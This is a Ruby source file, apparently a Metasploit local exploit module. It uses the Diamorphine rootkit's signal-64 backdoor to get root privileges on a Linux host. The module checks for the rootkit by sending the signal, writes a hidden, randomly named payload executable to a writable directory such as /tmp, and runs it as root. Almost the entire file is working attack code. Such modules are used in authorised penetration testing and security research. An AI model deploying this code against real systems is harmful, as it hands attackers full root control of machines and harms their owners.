class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Diamorphine Rootkit Signal Privilege Escalation',
      'Description'    => %q{
        This module uses Diamorphine rootkit's privesc feature using signal
        64 to elevate the privileges of arbitrary processes to UID 0 (root).

        This module has been tested successfully with Diamorphine from `master`
        branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'm0nad', # Diamorphine
          'bcoles' # Metasploit
        ],
      'DisclosureDate' => '2013-11-07', # Diamorphine first public commit
      'References'     =>
        [
          ['URL', 'https://github.com/m0nad/Diamorphine']
        ],
      'Platform'       => ['linux'],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Auto', {}]],
      'Notes'          =>
        {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'DefaultTarget'  => 0))
    register_options [
      OptInt.new('SIGNAL', [true, 'Diamorphine elevate signal', 64])
    ]
    register_advanced_options [
      OptBool.new('ForceExploit', [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def signal
    datastore['SIGNAL'].to_s
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload_and_chmodx(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
    chmod path, 0755
  end

  def cmd_exec_elevated(cmd)
    vprint_status "Executing #{cmd} ..."
    res = cmd_exec("sh -c 'kill -#{signal} $$ && #{cmd}'").to_s
    vprint_line res unless res.blank?
    res
  end

  def check
    res = cmd_exec_elevated 'id'

    if res.include?('invalid signal')
      return CheckCode::Safe("Signal '#{signal}' is invalid")
    end

    unless res.include?('uid=0')
      return CheckCode::Safe("Diamorphine is not installed, or incorrect signal '#{signal}'")
    end

    CheckCode::Vulnerable("Diamorphine is installed and configured to handle signal '#{signal}'.")
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 8..12}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe
    register_file_for_cleanup payload_path

    cmd_exec_elevated "#{payload_path} & echo "
  end
end
